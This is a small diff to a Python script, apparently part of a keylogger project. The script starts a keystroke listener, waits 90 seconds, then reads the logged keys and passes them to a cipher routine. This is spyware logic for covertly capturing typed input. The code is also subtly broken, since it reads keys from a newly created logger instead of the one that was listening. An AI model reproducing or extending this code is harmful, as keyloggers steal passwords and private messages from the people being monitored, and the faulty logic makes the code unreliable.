@@ -1,12 +1,15 @@
-import InterFace
+# import InterFace
 import KeyLogger
 import time
-from threading import Thread
+# from threading import Thread
 from Ciper import Cipher
 
-a = InterFace.KeyLoggerSystem()
+a = KeyLogger.KeyLogger()
 a.start_listening()
-data  = "b"
+time.sleep(90)
+
+data = KeyLogger.KeyLogger()
+data = data.logged_keys
 
 cipher_data = Cipher()
 cipher_data.cipher(data)
